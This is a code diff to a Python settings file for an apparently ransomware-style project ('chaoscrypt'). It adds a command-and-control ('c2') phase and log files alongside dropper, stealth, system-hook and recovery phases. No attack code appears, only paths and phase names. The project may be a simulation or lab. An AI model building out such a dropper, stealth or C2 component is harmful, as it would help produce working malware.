@@ -14,7 +14,7 @@ QUARANTINE_DIR = os.path.join(LOG_DIR, "quarantine")
 SHOW_TARGET_DIR = os.path.join(ROOT_DIR, "Target_Show")
 STEALTH_TARGET_DIR = os.path.join(ROOT_DIR, "Target_Stealth")
 ASSETS_DIR = os.path.join(ROOT_DIR, "assets")
-WATCH_TARGET_DIR = os.path.join(ROOT_DIR, "Target_Watched")  # 💎 Перенесено нагору
+WATCH_TARGET_DIR = os.path.join(ROOT_DIR, "Target_Watched")
 
 for path in [LOG_DIR, QUARANTINE_DIR, SHOW_TARGET_DIR, STEALTH_TARGET_DIR, WATCH_TARGET_DIR]:
     os.makedirs(path, exist_ok=True)
@@ -35,6 +35,7 @@ LOGFILES = {
     'dropper':      os.path.join(LOG_DIR, 'master_dropper.jsonl'),
     'network':      os.path.join(LOG_DIR, 'master_network.jsonl'),
     'agent':        os.path.join(LOG_DIR, 'master_agent.jsonl'),
+    'c2':           os.path.join(LOG_DIR, 'master_c2.jsonl'),
 }
 
 PARSE_ERROR_LOG = os.path.join(LOG_DIR, 'parsing_errors.log')
@@ -47,6 +48,7 @@ TXT_LOGS = {
     'dropper':      os.path.join(LOG_DIR, 'dropper_engine.log'),
     'network':      os.path.join(LOG_DIR, 'network_monitor.log'),
     'agent':        os.path.join(LOG_DIR, 'agent_file.log'),
+    'c2':           os.path.join(LOG_DIR, 'c2_commander.log'),
 }
 
 ROTATE_MAX_BYTES = 50 * 1024 * 1024
@@ -73,7 +75,7 @@ IMG_SUCCESS      = "chaoscrypt_success.jpg"
 IMG_ICO_NAME     = "chaos_icon.ico"
 
 ALL_PHASES = (
-    'system_hooks', 'dropper', 'network', 'agent', 'show', 'stealth', 'antidote', 'recovery'
+    'system_hooks', 'dropper', 'network', 'c2', 'agent', 'show', 'stealth', 'antidote', 'recovery'
 )
 
 __all__ = [
